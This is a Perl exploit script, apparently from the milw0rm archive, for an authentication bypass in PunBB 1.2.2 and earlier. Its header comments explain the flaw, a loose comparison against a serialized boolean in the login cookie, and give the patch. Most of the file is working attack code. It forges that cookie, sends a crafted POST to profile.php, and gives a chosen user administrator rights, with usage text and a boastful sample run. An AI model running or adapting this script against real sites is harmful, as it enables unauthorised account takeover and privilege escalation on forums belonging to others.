#!/usr/bin/perl
use IO::Socket;

#
#   PunBB version <= 1.2.2 auth bypass exploit
#
# -------------------------------------------------
# About vuln:
# lets look file /include/functions.php
# ### code start ###
# function check_cookie(&$pun_user)
# {
# ...
# if (isset($_COOKIE[$cookie_name]))
# list($cookie['user_id'], $cookie['password_hash']) = @unserialize($_COOKIE[$cookie_name]);
#
# if ($cookie['user_id'] > 1)
# {
# // Check if there's a user with the user ID and password hash from the cookie
# $result = $db->query('SELECT .... tra-la-la... );
# $pun_user = $db->fetch_assoc($result);
# 
# // If user authorisation failed
# if (!isset($pun_user['id']) || md5($cookie_seed.$pun_user['password']) != $cookie['password_hash'])
# ...                                                                    ^^^ HERE !!!
# ### code end ###
# and we can logging with any user id if we use boolean value in cookie password_hash 
# evil cookie is : a:2:{i:0;s:1:"2";i:1;b:1;} where 2 is user id
# 
# fix:
# if (!isset($pun_user['id']) || md5($cookie_seed.$pun_user['password']) != $cookie['password_hash'])
# change to
# if (!isset($pun_user['id']) || md5($cookie_seed.$pun_user['password']) !== $cookie['password_hash'])
# -------------------------------------------------
# (c)oded by 1dt.w0lf // 09.03.2005 // r57 // www.rst.void.ru
# -------------------------------------------------
# example:
# r57punbb.pl nerf.ru /forum/ 2 47
# + Exploit success!
# + Group membership saved!
# + Now user with id=47 have admin level!
# ja-ja-ja dast ist fantastish =)
# ------------------------------------------------

$server    = $ARGV[0];
$folder    = $ARGV[1];
$admin_uid = $ARGV[2];
$user_uid  = $ARGV[3];
$suc = 0;
if (@ARGV < 4 || $admin_uid =~ /[^\d]/ || $user_uid =~ /[^\d]/)
{
 print q{
       PunBB version <= 1.2.2 auth bypass exploit 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 usage: r57punbb.pl [host] [/folder/] [admin_id] [user_id]

 [host]     - hostname where punbb installed
 [/folder/] - folder where punbb installed
 [admin_id] - id of user who have admin rights
 [user_id]  - user with this id get admin level after 
              success exploiting
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 r57 private code // rst.void.ru
 };
 exit();
}
$server =~ s/^((?:http:\/\/)*)([^\/]*)(\/*)$/$2/;
$str    = 'Group membership saved';
$cook   = 'a:2:{i:0;s:'.length($admin_uid).':"'.$admin_uid.'";i:1;b:1;}';
$data   = 'form_sent=1&group_id=1&update_group_membership=Save';
$cook   =~ s/(.)/"%".uc(sprintf("%2.2x",ord($1)))/eg;

$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort => "80") || die "$socket error $!";
print $socket "POST ${folder}profile.php?section=admin&id=$user_uid&action=foo HTTP/1.0\n";
print $socket "Host: $server\n";
print $socket "Referer: http://$server${folder}profile.php?section=admin&id=$user_uid\n";
print $socket "Cookie: punbb_cookie=$cook\n";
print $socket "Content-Type: application/x-www-form-urlencoded\n";
print $socket "Content-Length: ".length($data)."\n\n";
print $socket "$data\n\n";
while(<$socket>){ if(/$str/) { $suc = 1; last; } }
($suc)?(print "+ Exploit success!\n+ $str!\n+ Now user with id=$user_uid have admin level!\n")
      :(print "- Exploit failed\n")
      
#--- EOF ---

# milw0rm.com [2005-03-29]
